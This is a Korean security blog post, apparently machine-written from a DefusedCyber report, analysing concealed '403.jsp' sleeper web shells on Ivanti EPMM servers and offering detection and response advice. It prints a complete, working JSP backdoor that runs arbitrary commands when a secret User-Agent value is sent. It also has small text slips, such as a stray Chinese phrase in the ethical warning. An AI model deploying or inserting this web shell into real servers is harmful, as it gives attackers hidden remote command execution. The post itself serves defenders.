---
title: "🔒 Ivanti EPMM Sleeper Shells: 잠복형 백도어 공격 분석"
date: 2026-04-19T20:33:41+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

보안 관제 센터의 모니터링 화면에서 수많은 403 Forbidden 에러 로그가 쏟아져 나오고 있습니다. 보안 담당자인 당신은 최근 Ivanti EPMM(Endpoint Manager Mobile)의 Critical 취약점에 대한 패치를 완료했기 때문에, 이 로그들이 단순한 잘못된 접근 시도라고 안심하고 지나칠 수 있습니다. 하지만 이것은 해커들이 당신에게 보여주고 싶은 '허상'일 뿐입니다.

지금 발생하고 있는 공격은 단순한 무차별 대입 공격이 아닙니다. 공격자는 이미 시스템 내부에 'Sleeper Shell(잠복형 쉘)'이라는 악성 백도어를 심어두었습니다. 이 웹 쉘은 특별한 활성화 키(Key)가 없는 한 평생 403 에러를 반환하며 마치 정상적인 차단된 접근인 것처럼 위장합니다. 왜 이 주제가 중요할까요? 패치가 완료된 서버라 하더라도, 공격이 시작되기 이전에 이미 내부에 뿌리내린 백도어는 언제든지 시스템의 장악권을 넘겨줄 준비가 되어 있기 때문입니다. 오늘 우리는 이 교묘한 지속 위협(Persistence) 기법의 메커니즘을 해부하고 탐지 방안을 모색하겠습니다.

## 본론

### 기술적 원리: 403jsp와 Sleeper Shell의 메커니즘

Ivanti EPMM 환경에서 주로 발견되는 이 Sleeper Shell은 `403.jsp`라는 파일명을 사용하거나, 특정 경로에 숨어들어가는 특징을 보입니다. 일반적인 웹 쉘은 접근 즉시 악의적인 명령을 실행하고 결과를 반환하기 때문에 WAF(웹 방화벽)나 IDS(침입 탐지 시스템)의 정규식 패턴에 의해 비교적 쉽게 탐지됩니다.

하지만 Sleeper Shell은 **'기만(Deception)'**을 핵심 전략으로 삼습니다. 기본적으로 어떠한 HTTP 요청이 들어와도 서버는 `403 Forbidden` 상태 코드를 클라이언트에 반환합니다. 보안 장비나 분석가는 이를 단순히 "권한 없는 접근이 차단되었다"고 판단하고 넘어가게 됩니다. 하지만 공격자는 HTTP 헤더에 특정한 암호화된 키나 쿠키 값을 삽입하여 요청을 보낼 때, 비로소 쉘이 깨어나 명령을 실행하게 됩니다.

이 기법은 EDR이나 백신의 행동 기반 탐지(Heuristic Analysis)를 우회하는 데에도 탁월합니다. 파일 시스템상에는 존재하지만 실행되지 않는 '死(Dead)' 코드로 남아있기 때문입니다.

### 공격 시나리오 시각화

아래 다이어그램은 공격자가 익스플로잇을 통해 Sleeper Shell을 심고, 이를 통해 지속적으로 시스템을 장악하는 과정을 도식화한 것입니다.

```javascript
graph TD
    A[공격자] -->|CVE 익스플로잇| B[Ivanti EPMM 서버]
    B -->|웹 쉘 업로드| C[403.jsp Sleeper Shell]
    D[보안 관제팀] -->|정기 스캔/로그 확인| C
    C -->|일반 요청| E[403 Forbidden 반환]
    E -->|오탐 판단 및 무시| D
    A -->|Magic Header 포함 요청| C
    C -->|인식 및 코드 실행| F[Reverse Shell / Command Execution]
    F -->|시스템 권한 획득| G[데이터 유출/랜섬웨어]
```

### PoC 코드 분석 (학습 목적)
> **⚠️ 윤리적 경고**: 아래 코드는 백도어의 탐지 및 방어를 이해하기 위한 교육용 개념 증명(PoC) 코드입니다.未经授权的系统 접근 또는 악용은 엄격히 금지되며 법적 책임을 초래할 수 있습니다.

실제 공격에서 사용되는 `403.jsp` 스크립트의 로직은 매우 간단하지만 치명적입니다. 다음은 Java(JSP)로 작성된 Sleeper Shell의 핵심 로직 예시입니다.

```plain text
<%@ page import="java.io.*" %>
<%
    // 활성화 키 확인 (예: 특정 User-Agent 헤더)
    String magicKey = request.getHeader("User-Agent");
    String trigger = "SleeperAgent/1.0";

    // 키가 일치하지 않으면 즉시 403 에러 반환 및 종료
    if (magicKey == null || !magicKey.contains(trigger)) {
        response.sendError(403, "Forbidden");
        return;
    }

    // 키가 일치할 경우에만 아래 코드 실행
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
%>
```

이 코드를 분석해보면, 일반적인 사용자나 스캐너가 접근할 때는 `response.sendError(403)`에 의해 즉시 연결이 끊기므로 뒤이어 오는 `Runtime.getRuntime().exec(cmd)` 코드는 결코 실행되지 않습니다. 오직 `User-Agent` 헤더에 `SleeperAgent/1.0`이라는 특정 문자열이 포함된 경우에만 서버 내부 명령어를 실행할 수 있는 권한이 부여됩니다.

### 탐지 및 방어 가이드

이러한 잠복형 백도어는 기존의 시그니처 기반 보안 제품으로는 탐지가 어렵습니다. 따라서 다음과 같은 다층적인 방어 전략이 필요합니다.

#### 1. 파일 무결성 모니터링 (FIM) 강화 웹 서버의 문서 루트(Document Root) 디렉토리에 대해 실시간 감사를 수행해야 합니다. 알려지지 않은 JSP 파일이 생성되거나 수정된 시점을 포착하는 것이 핵심입니다.

#### 2. 로그 분석 및 이상 징후 탐지 403 에러 로그에만 의존해서는 안 됩니다. 다음 표를 참조하여 일반적인 403 에러와 백도어의 403 반응을 구별해야 합니다.

| 구분 | 정상적인 403 Forbidden | Sleeper Shell (403.jsp) |
| :--- | :--- | :--- |
| **요청 패턴** | 특정 리소스에 대한 반복적 시도 | 랜덤하거나 비정상적인 경로(`/mics/...`) 접근 시도 |
| **에러 발생 빈도** | 사용자 실수나 인증 실패로 간헐적 발생 | 봇이나 공격자의 'Keep-Alive' 확인으로 주기적 발생 가능 |
| **User-Agent** | 일반적인 브라우저 (Chrome, Safari 등) | 다양하나, 특정 헤더값 전송 전 403 반환 |
| **응답 시간** | 매우 빠름 (즉시 거부) | 처리 로직이 있어 일반적인 403보다 미세하게 느릴 수 있음 |

#### 3. 네트워크 트래픽 분석 (NDR)  outbound 트래픽을 주시해야 합니다. Sleeper Shell이 활성화되었을 때 C2(Command & Control) 서버와 통신하거나 데이터를 탈취하는 과정에서 발생하는 비정상적인 아웃바운드 연결을 차단해야 합니다.

#### 4. 대응 절차 (Step-by-step) 만나 Sleeper Shell 감염이 의심된다면 다음 절차를 따르십시오.

1.  **네트워크 차단**: 즉시 해당 서버의 외부 인터넷 연결을 차단하여 C2 서버와의 통신을 끊습니다.
2.  **포렌식 이미징**: 라이브 포렌식보다는 메모리 덤프 및 디스크 이미징을 통해 증거를 확보합니다. 이때 `403.jsp` 또는 의심스러운 날짜의 JSP 파일을 검색합니다.
3.  **백도어 제거 및 복구**: 감염된 시스템은 신뢰할 수 없으므로, 백업으로부터 완전히 재설치(Re-image)하는 것이 가장 안전합니다. 단순히 파일만 삭제해서는 프로세스나 다른 숨겨진 백도어가 남아있을 수 있습니다.
4.  **자격 증명 재설정**: 모든 계정의 비밀번호와 API 키를 재설정하고, 세션을 무효화합니다.

## 결론

Ivanti EPMM Sleeper Shell 공격은 패치 관리(Patch Management)가 보안의 끝이 아님을 명확히 보여줍니다. 취약점을 통해 진입한 공격자는 단순한 파괴 행위를 넘어, 오랫동안 시스템 내부에 잠복하며 정보를 수집하고 영향력을 확장하려 합니다.

핵심은 '존재하지 않는 것처럼 보이는' 위협을 찾아내는 것입니다. 403 에러가 단순한 차단일 뿐이라고 믿지 말고, 그 이면에 숨겨진 의도를 의심하는 경계심이 필요합니다. 파일 무결성 검사와 행위 기반 탐지(EDR/XDR)를 결합한 방어 전략만이 이 잠복형 위협을 근절할 수 있습니다.

보안은 완벽한 요새를 쌓는 것이 아니라, 요새 내부의 그림자를 밝히는 지속적인 과정입니다. 지금 당신의 서버 로그 속에 숨겨진 `403.jsp`가 없는지 다시 한번 확인해보시기 바랍니다.

### 참고자료
- [DefusedCyber: Ivanti EPMM Sleeper Shells](https://defusedcyber.com/ivanti-epmm-sleeper-shells-403jsp)
- [MITRE ATT&CK: T1505.003 Server Software Component](https://attack.mitre.org/techniques/T1505/003/)
- [Ivanti Security Advisory](https://www.ivanti.com/blog/)

---

**출처**: [https://defusedcyber.com/ivanti-epmm-sleeper-shells-403jsp](https://defusedcyber.com/ivanti-epmm-sleeper-shells-403jsp)